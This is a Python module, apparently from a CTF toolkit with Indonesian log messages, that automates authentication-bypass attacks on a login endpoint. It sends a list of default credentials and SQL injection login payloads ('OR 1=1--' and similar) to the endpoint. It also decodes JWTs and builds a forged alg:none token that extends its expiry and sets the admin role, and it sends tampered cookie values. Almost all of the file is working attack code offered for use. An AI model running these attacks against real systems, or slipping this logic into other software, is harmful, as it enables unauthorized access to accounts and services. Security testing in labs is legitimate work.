"""Auth bypass tester: default-credential brute with success heuristics,
classic SQLi login bypass payloads, JWT attacks (alg:none, expiry), and
cookie/header role tampering."""
from __future__ import annotations

import base64
import json
import time
from urllib.parse import urljoin

from .http_client import make_client, success_heuristics

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("administrator", "administrator"), ("test", "test"), ("user", "user"),
    ("guest", "guest"), ("admin", "letmein"), ("admin", "changeme"),
    ("admin", "1234"), ("admin", "qwerty"), ("sysadmin", "sysadmin"),
]

SQLI_LOGIN_PAYLOADS = [
    "' OR 1=1--", "' OR '1'='1'--", "admin'--", "' OR 1=1#",
    "') OR ('1'='1", "' OR 1=1 LIMIT 1--", "\" OR \"1\"=\"1\"--",
]

JWT_TAMPER_PAYLOADS = ["admin", "root", "*", "' OR 1=1--"]


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def analyze_jwt(token: str) -> dict:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"valid": False, "error": "bukan format JWT (3 bagian)"}
    pad = lambda p: p + "=" * (-len(p) % 4)  # noqa: E731
    try:
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
    except Exception as e:
        return {"valid": False, "error": f"decode gagal: {e}"}
    import time as _t
    exp = payload.get("exp")
    info = {
        "valid": True, "header": header, "payload": payload,
        "alg": header.get("alg"), "expired": bool(exp and exp < _t.time()),
        "signature_b64": parts[2],
    }
    attacks = []
    if header.get("alg", "").lower() == "none" or "alg" not in header:
        attacks.append("alg sudah none — server mungkin menerima token tanpa signature")
    attacks.append("coba kirim tanpa signature: header.payload. (trailing dot)")
    attacks.append("coba HS256 key confusion bila RS256 (gunakan public key sebagai secret)")
    if exp:
        attacks.append("coba ubah exp ke masa depan lalu sign ulang (butuh key) / alg:none")
    info["suggested_attacks"] = attacks
    # pre-built forged tokens
    new_header = {"alg": "none", "typ": "JWT"}
    forged_payload = dict(payload)
    forged_payload["exp"] = int(_t.time()) + 86400 * 365
    if "role" in payload:
        forged_payload["role"] = "admin"
    if "is_admin" in payload:
        forged_payload["is_admin"] = True
    info["forged_alg_none_token"] = f"{_b64url(json.dumps(new_header).encode())}.{_b64url(json.dumps(forged_payload).encode())}."
    return info


async def test_login_bypass(url: str, username_field: str = "username",
                            password_field: str = "password",
                            extra_fields: dict | None = None,
                            cookies: dict | None = None,
                            headers: dict | None = None,
                            delay: float = 0.2, log=print) -> dict:
    """Baseline the login endpoint, then try default creds + SQLi payloads."""
    results: list[dict] = []
    extra_fields = extra_fields or {}
    success_all: list[dict] = []

    async with make_client(base_url="", cookies=cookies, headers=headers) as client:
        # baseline
        try:
            baseline = await client.post(url, data={username_field: "ctfsuite_probe_x",
                                                    password_field: "ctfsuite_probe_y",
                                                    **extra_fields})
        except Exception as e:
            return {"ok": False, "error": f"gagal menghubungi {url}: {e}"}
        log(f"[i] baseline {baseline.status_code} len={len(baseline.content)}")

        async def attempt(user: str, pwd: str, kind: str) -> None:
            time.sleep(delay)
            try:
                r = await client.post(url, data={username_field: user,
                                                 password_field: pwd,
                                                 **extra_fields})
            except Exception as e:
                log(f"[!] error attempt {user!r}: {e}")
                return
            ok, reason = success_heuristics(baseline, r)
            row = {"kind": kind, "username": user, "password": pwd,
                   "status": r.status_code, "length": len(r.content),
                   "success": ok, "reason": reason}
            results.append(row)
            if ok:
                log(f"[!] SUCCESS? {kind} {user!r}:{pwd!r} -> {reason}")
                success_all.append(row)
            else:
                log(f"[-] {kind} {user!r}:{pwd!r} gagal")

        # default creds
        log("[i] mencoba kredensial default...")
        for u, p in DEFAULT_CREDS:
            await attempt(u, p, "default-creds")

        # SQLi login bypass: password-first (keep a real/any username)
        log("[i] mencoba payload SQLi login bypass...")
        for payload in SQLI_LOGIN_PAYLOADS:
            await attempt("admin", payload, "sqli-password")
        for payload in SQLI_LOGIN_PAYLOADS[:4]:
            await attempt(payload, "anything", "sqli-username")

    return {
        "ok": True, "url": url, "attempts": results,
        "successes": success_all,
        "note": "Verifikasi manual: 'success' adalah heuristik (redirect/cookie/panjang beda).",
    }


async def test_cookie_tamper(base_url: str, cookie_name: str, values: list[str],
                             check_url: str | None = None,
                             headers: dict | None = None, log=print) -> dict:
    """Send tampered cookie values and diff response vs baseline."""
    target = urljoin(base_url, check_url or "/")
    out = []
    async with make_client(base_url="") as client:
        try:
            baseline = await client.get(target, headers=headers)
        except Exception as e:
            return {"ok": False, "error": str(e)}
        for v in values:
            try:
                r = await client.get(target, cookies={cookie_name: v}, headers=headers)
            except Exception:
                continue
            changed = r.status_code != baseline.status_code or \
                abs(len(r.content) - len(baseline.content)) > max(len(baseline.content) * 0.2, 40)
            out.append({"value": v, "status": r.status_code,
                        "length": len(r.content), "changed_from_baseline": changed})
            log(f"[{'!' if changed else '-'}] cookie {cookie_name}={v!r} -> {r.status_code} len={len(r.content)}")
    return {"ok": True, "target": target, "results": out,
            "hint": "nilai 'true', '1', 'admin', base64 {'role':'admin'} layak dicoba"}
